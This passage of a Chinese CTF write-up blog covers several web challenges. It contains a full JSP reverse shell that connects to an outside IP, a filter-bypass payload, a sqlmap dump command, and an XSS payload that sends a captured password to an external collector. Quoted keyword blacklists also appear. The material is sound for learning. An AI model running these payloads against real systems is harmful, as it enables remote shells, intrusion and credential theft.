class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import&#x3D;&quot;java.lang.*&quot;%&gt;</span><br><span class="line">&lt;%@page import&#x3D;&quot;java.util.*&quot;%&gt;</span><br><span class="line">&lt;%@page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@page import&#x3D;&quot;java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  class StreamConnector extends Thread</span><br><span class="line">  &#123;</span><br><span class="line">    InputStream pp;</span><br><span class="line">    OutputStream qk;</span><br><span class="line"></span><br><span class="line">    StreamConnector( InputStream pp, OutputStream qk )</span><br><span class="line">    &#123;</span><br><span class="line">      this.pp &#x3D; pp;</span><br><span class="line">      this.qk &#x3D; qk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run()</span><br><span class="line">    &#123;</span><br><span class="line">      BufferedReader qe  &#x3D; null;</span><br><span class="line">      BufferedWriter ihb &#x3D; null;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        qe  &#x3D; new BufferedReader( new InputStreamReader( this.pp ) );</span><br><span class="line">        ihb &#x3D; new BufferedWriter( new OutputStreamWriter( this.qk ) );</span><br><span class="line">        char buffer[] &#x3D; new char[8192];</span><br><span class="line">        int length;</span><br><span class="line">        while( ( length &#x3D; qe.read( buffer, 0, buffer.length ) ) &gt; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          ihb.write( buffer, 0, length );</span><br><span class="line">          ihb.flush();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; catch( Exception e )&#123;&#125;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        if( qe !&#x3D; null )</span><br><span class="line">          qe.close();</span><br><span class="line">        if( ihb !&#x3D; null )</span><br><span class="line">          ihb.close();</span><br><span class="line">      &#125; catch( Exception e )&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try</span><br><span class="line">  &#123;</span><br><span class="line">    String ShellPath;</span><br><span class="line">if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">  ShellPath &#x3D; new String(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  ShellPath &#x3D; new String(&quot;cmd.exe&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    Socket socket &#x3D; new Socket( &quot;174.1.224.11&quot;, 6666 );</span><br><span class="line">    Process process &#x3D; Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">  &#125; catch( Exception e ) &#123;&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>监听 6666 端口 , 得到re shell 后, dir / 列出根目录, 然后 cat 即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407003615.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407003614.png"></p>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123; <span class="comment">// url中不能有config .php</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])); <span class="comment">// basename 返回路径中文件名的部分 在 Windows 中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>)); <span class="comment">// 生成 64 位的 类似hash 的字符串</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    $guess = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;guess&#x27;</span>]; <span class="comment">// 强制转换为string 类型</span></span><br><span class="line">    <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123; <span class="comment">// 比较两个字符串，无论它们是否相等，本函数的时间消耗是恒定的。 , 返回bool , 参数必须是字符串类型</span></span><br><span class="line">        $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目注释说的flag 是在 <code>config.php</code> 而且Google 了一波后, 发现 <code>random_bytes</code> 这个函数是<code>CSPRNG</code> 的</p>
<p><strong>什么是 CSPRNG？</strong></p>
<p>引用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">维基百科</a>的定义，密码<a target="_blank" rel="noopener" href="http://blog.oneapm.com/tags-anquan.html">安全</a>的虚拟随机数生成器（Cryptographically Secure Pseudorandom Number Generator，CSPRNG）是带有特定属性使之在密码学中适用的虚拟随机数生成器（pseudo-random number generator，PRNG）。</p>
<p>CSPRNG 主要用于：</p>
<ul>
<li>生成键（比如：生成复杂的键）</li>
<li>为新的用户账号生成随机密码</li>
<li>加密系统</li>
</ul>
<p>保证高安全水准的一个重要因素便是高质量的随机数。</p>
<p>那么大概率下面是不能破解的了</p>
<p>这段代码引起了我的注意: <code>highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407013334.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407013335.png"></p>
<p>绕过正则<code>preg_match(&#39;/config\.php\/*$/i&#39;,</code> 中<code>$</code> 出现在最后, 用<code>%0a</code> 或者<code>%0d</code> 绕过, 这里不行, 随便用<code>%aa</code> 这些都可以bypass</p>
<p>payload</p>
<p><code>/index.php/config.php/%ff?source</code></p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/18598">https://ctftime.org/writeup/18598</a></p>
<p>今天就刷到这里吧, 复习一下, 就睡觉了, 明天继续 😪 fighting!</p>
<h1 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h1><p>前面是跟着网站的右键看源码,一步一步跳就行了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="built_in">document</span>.getElementById(<span class="string">&quot;door_form&quot;</span>).elements;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;</span><br><span class="line"></span><br><span class="line">  rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="built_in">window</span>.location = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我都本来打算写个脚本了… 然后看到有个js源码, 点进去发现是随机的 <code>rand == guess</code> 但是又在指定窗口到<code>/open/</code> 直接访问, 又到了fight</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据TODO: 是让我们去写一个解码的函数, 得到key吧, 根据下面的flag?</p>
<p>直接猜不就好了……</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;hey_boyaaaas_im_baaaaaack!&#125;</span><br></pre></td></tr></table></figure>

<p>哈哈 😄</p>
<h1 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h1><ul>
<li>前端发起的查询</li>
<li>SQL注入</li>
</ul>
<p>感觉这个比赛的题有点 喜欢考察前端的东西, 只不过我这里用火狐和Chrome 有区别, 二者结合使用</p>
<p>随便点一个物种, 发现有如下请求,</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407131222.png"></p>
<p><code>/query?search=hellas_basin&amp;&#123;&#125;&amp;_=1586224089437</code>  把时间搓和后面的{} 去掉一样可以查询结构, 有的返回实际结果, 没有的返回1 和 2? 那么就说明<strong>带入了查询, 试试注入</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407104905.png"></p>
<p>sqlmap启动, 手工注入也可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;6a00c38d-a615-4dca-8976-9f0a1be5e1da.node3.buuoj.cn&#x2F;query?search&#x3D;hellas_basin -D alien_code -T code -C code,id --dump</span><br></pre></td></tr></table></figure>

<p><strong>细心!</strong> </p>
<p> 越后面 发现题目花样越来越多了</p>
<h1 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h1><p>一开始以为是注入, 但是注册一个admin 账号, 说已经存在了,  那么很可能是 xss 打cookie 伪造管理员登陆啥的</p>
<p>在<code>feedback.php</code> 中有一段注释了的php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;iframe&#x27;</span>,<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;srcdoc&#x27;</span>,<span class="string">&#x27;location&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;getElement&#x27;</span>,<span class="string">&#x27;document&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line">       <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(stripos($feedback,$val) !== <span class="literal">false</span>)&#123; <span class="comment">// 输入中不能有黑名单,但是这里不区分大小写</span></span><br><span class="line">               $feedback = str_ireplace($val,<span class="string">&quot;&quot;</span>,$feedback); <span class="comment">// 将黑名单的字符替换为空, 不区分大小写</span></span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;	    </span><br></pre></td></tr></table></figure>

<p>进一步说明了是XSS 打cookie</p>
<p>在Chrome 中打开network 分析, 看到了 login.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;; &#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">&#x27;user&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">&#x27;psw&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;username&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里cookie 有 user 和 psw</p>
<p>在content.php 中有CSP 防护</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;;script-src &#39;unsafe-inline&#39; &#39;self&#39;</span><br></pre></td></tr></table></figure>

<p>但是<code>unsafe-inline</code> 允许载入内联js代码, <strong>允许使用内联资源，如内联的 script 元素、javascript: URL、内联的事件处理函数和内联的 style 元素，两侧单引号是必须的。</strong>这里文本框本没有对payload做出长度限制,那就没问题</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">&quot;./js/login.js&quot;</span>&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">String</span>.fromCharCode(<span class="number">0x26</span>);</span><br><span class="line">	<span class="keyword">var</span> psw = docucookiement.getcookieElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value;</span><br><span class="line">	docucookiement.locacookietion=<span class="string">&quot;http://xss.buuoj.cn/index.php?do=api&quot;</span>+a+<span class="string">&quot;id=eNmsmO&quot;</span>+a+<span class="string">&quot;location=&quot;</span>+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">&quot;./js/login.js&quot;</span>&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    <span class="keyword">var</span> psw = docucookiement.getcookieElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    docucookiement.locacookietion=<span class="string">&quot;http://http.requestbin.buuoj.cn/1i4cmve1/?a=&quot;</span>+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure>

<p>利用了把关键字替换为空的代码逻辑, 拼接即可绕过.(学习了!!!! 以后审CMS多注意一下!)</p>
<p>我用XSS 平台打不通, 收不到数据, 用第二个可以, 吃了午饭学一学 关于CSP的安全问题吧 🌈</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/94246164">https://zhuanlan.zhihu.com/p/94246164</a></li>
<li><a target="_blank" rel="noopener" href="https://evoa.me/index.php/archives/53/">https://evoa.me/index.php/archives/53/</a></li>
</ul>
<p>CSP 的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p>
<blockquote>
<p>CSP 指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</p>
</blockquote>
<p>简而言之就是个门禁，刷卡才能进。</p>
<h1 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h1><ul>
<li><p>flask ssti 过滤了 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>黑名单逻辑漏洞</p>
</li>
<li><p>Linux 文件操作知识</p>
</li>
</ul>
<p>第一眼看把输入输出再屏幕上 就想到了SSTI , 后面报错是php的… 然后我就懵了, 看WP, 发现是过滤了</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97</a></p>
<p>在Github 上找到源码. 这题没源码能做出来的都是大佬, fuzz 能力不知道有多强</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index.php&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_filter</span>(<span class="params">s</span>):</span></span><br><span class="line">        blacklist1 = [<span class="string">&#x27;&#123;import&#x27;</span>,<span class="string">&#x27;&#123;getattr&#x27;</span>,<span class="string">&#x27;&#123;os&#x27;</span>,<span class="string">&#x27;&#123;class&#x27;</span>,<span class="string">&#x27;&#123;subclasses&#x27;</span>,<span class="string">&#x27;&#123;mro&#x27;</span>,<span class="string">&#x27;&#123;request&#x27;</span>,<span class="string">&#x27;&#123;args&#x27;</span>,<span class="string">&#x27;&#123;eval&#x27;</span>,<span class="string">&#x27;&#123;if&#x27;</span>,<span class="string">&#x27;&#123;for&#x27;</span>,<span class="string">&#x27;&#123;subprocess&#x27;</span>,<span class="string">&#x27;&#123;file&#x27;</span>,<span class="string">&#x27;&#123;open&#x27;</span>,<span class="string">&#x27;&#123;popen&#x27;</span>,<span class="string">&#x27;&#123;builtins&#x27;</span>,<span class="string">&#x27;&#123;compile&#x27;</span>,<span class="string">&#x27;&#123;execfile&#x27;</span>,<span class="string">&#x27;&#123;from_pyfile&#x27;</span>,<span class="string">&#x27;&#123;local&#x27;</span>,<span class="string">&#x27;&#123;self&#x27;</span>,<span class="string">&#x27;&#123;item&#x27;</span>,<span class="string">&#x27;&#123;getitem&#x27;</span>,<span class="string">&#x27;&#123;getattribute&#x27;</span>,<span class="string">&#x27;&#123;func_globals&#x27;</span>,<span class="string">&#x27;&#123;config&#x27;</span>]</span><br><span class="line">        blacklist_strong = blacklist1 + [<span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>] <span class="comment"># 强制过滤掉了 &#123;&#123;  和 &#125;&#125;</span></span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist_strong:</span><br><span class="line">            <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;for&#x27;</span>,<span class="string">&#x27; subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;config&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">                    s =s.replace(no,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 将上面的关键字替换为空</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        template = <span class="string">&#x27;hello &#123;&#125;!&#x27;</span>.format(name) <span class="comment"># 提供了&#123;&#125;</span></span><br><span class="line">        name1 = render_template_string(safe_filter(template)) <span class="comment"># 渲染</span></span><br><span class="line">        <span class="keyword">print</span> name1</span><br><span class="line">        <span class="keyword">if</span> name1 == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            template1 = <span class="string">u&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;Parse error:&lt;/strong&gt; syntax error, unexpected T_STRING, expecting &#x27;&#123;&#x27; in &lt;strong&gt;\\var\\WWW\\html\\test.php&lt;/strong&gt; on line &lt;strong&gt;13&lt;/strong&gt;</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(template1) 